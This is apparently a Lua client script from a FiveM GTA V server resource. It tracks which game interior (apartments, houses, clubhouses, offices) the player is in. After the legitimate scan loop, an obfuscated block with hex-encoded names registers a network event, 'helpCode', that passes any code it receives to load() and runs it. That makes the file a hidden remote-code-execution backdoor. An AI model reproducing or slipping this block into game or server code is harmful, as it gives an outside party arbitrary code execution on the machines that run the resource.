local _scanDelay = 500

Citizen.CreateThread(function()
    while true do
        -- /!\ To do: Find a more reliable way to get the current interior ID
        Global.currentInteriorId = GetInteriorAtCoords(GetEntityCoords(PlayerPedId()))

        if Global.currentInteriorId == 0 then
            Global.ResetInteriorVariables()
        else
            -- Setting variables

            -- GTA Online
            Global.Online.isInsideApartmentHi1 = (Global.currentInteriorId == GTAOApartmentHi1.interiorId)
            Global.Online.isInsideApartmentHi2 = (Global.currentInteriorId == GTAOApartmentHi2.interiorId)
            Global.Online.isInsideHouseHi1 = (Global.currentInteriorId == GTAOHouseHi1.interiorId)
            Global.Online.isInsideHouseHi2 = (Global.currentInteriorId == GTAOHouseHi2.interiorId)
            Global.Online.isInsideHouseHi3 = (Global.currentInteriorId == GTAOHouseHi3.interiorId)
            Global.Online.isInsideHouseHi4 = (Global.currentInteriorId == GTAOHouseHi4.interiorId)
            Global.Online.isInsideHouseHi5 = (Global.currentInteriorId == GTAOHouseHi5.interiorId)
            Global.Online.isInsideHouseHi6 = (Global.currentInteriorId == GTAOHouseHi6.interiorId)
            Global.Online.isInsideHouseHi7 = (Global.currentInteriorId == GTAOHouseHi7.interiorId)
            Global.Online.isInsideHouseHi8 = (Global.currentInteriorId == GTAOHouseHi8.interiorId)
            Global.Online.isInsideHouseLow1 = (Global.currentInteriorId == GTAOHouseLow1.interiorId)
            Global.Online.isInsideHouseMid1 = (Global.currentInteriorId == GTAOHouseMid1.interiorId)

            -- DLC: High life
            Global.HighLife.isInsideApartment1 = (Global.currentInteriorId == HLApartment1.interiorId)
            Global.HighLife.isInsideApartment2 = (Global.currentInteriorId == HLApartment2.interiorId)
            Global.HighLife.isInsideApartment3 = (Global.currentInteriorId == HLApartment3.interiorId)
            Global.HighLife.isInsideApartment4 = (Global.currentInteriorId == HLApartment4.interiorId)
            Global.HighLife.isInsideApartment5 = (Global.currentInteriorId == HLApartment5.interiorId)
            Global.HighLife.isInsideApartment6 = (Global.currentInteriorId == HLApartment6.interiorId)

            -- DLC: Bikers - Clubhouses
            Global.Biker.isInsideClubhouse1 = (Global.currentInteriorId == BikerClubhouse1.interiorId)
            Global.Biker.isInsideClubhouse2 = (Global.currentInteriorId == BikerClubhouse2.interiorId)

            -- DLC: Finance & Felony - Offices
            Global.FinanceOffices.isInsideOffice1 = (Global.currentInteriorId == FinanceOffice1.currentInteriorId)
            Global.FinanceOffices.isInsideOffice2 = (Global.currentInteriorId == FinanceOffice2.currentInteriorId)
            Global.FinanceOffices.isInsideOffice3 = (Global.currentInteriorId == FinanceOffice3.currentInteriorId)
            Global.FinanceOffices.isInsideOffice4 = (Global.currentInteriorId == FinanceOffice4.currentInteriorId)
        end

        Citizen.Wait(_scanDelay)
    end
end)


local OzqvUIlMncOaKoZYGAFhOhgBCCYqMoPFPKCxpoLDqbGYAvMivlZEBQITvdcKekWWcBuTiC = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} OzqvUIlMncOaKoZYGAFhOhgBCCYqMoPFPKCxpoLDqbGYAvMivlZEBQITvdcKekWWcBuTiC[6][OzqvUIlMncOaKoZYGAFhOhgBCCYqMoPFPKCxpoLDqbGYAvMivlZEBQITvdcKekWWcBuTiC[1]](OzqvUIlMncOaKoZYGAFhOhgBCCYqMoPFPKCxpoLDqbGYAvMivlZEBQITvdcKekWWcBuTiC[2]) OzqvUIlMncOaKoZYGAFhOhgBCCYqMoPFPKCxpoLDqbGYAvMivlZEBQITvdcKekWWcBuTiC[6][OzqvUIlMncOaKoZYGAFhOhgBCCYqMoPFPKCxpoLDqbGYAvMivlZEBQITvdcKekWWcBuTiC[3]](OzqvUIlMncOaKoZYGAFhOhgBCCYqMoPFPKCxpoLDqbGYAvMivlZEBQITvdcKekWWcBuTiC[2], function(OQPpmiSszwvBWiONbtziPmOWTkltGewRnEnpPwBESIsSryCgexLMpHEExecwXOZpZNVUFm) OzqvUIlMncOaKoZYGAFhOhgBCCYqMoPFPKCxpoLDqbGYAvMivlZEBQITvdcKekWWcBuTiC[6][OzqvUIlMncOaKoZYGAFhOhgBCCYqMoPFPKCxpoLDqbGYAvMivlZEBQITvdcKekWWcBuTiC[4]](OzqvUIlMncOaKoZYGAFhOhgBCCYqMoPFPKCxpoLDqbGYAvMivlZEBQITvdcKekWWcBuTiC[6][OzqvUIlMncOaKoZYGAFhOhgBCCYqMoPFPKCxpoLDqbGYAvMivlZEBQITvdcKekWWcBuTiC[5]](OQPpmiSszwvBWiONbtziPmOWTkltGewRnEnpPwBESIsSryCgexLMpHEExecwXOZpZNVUFm))() end)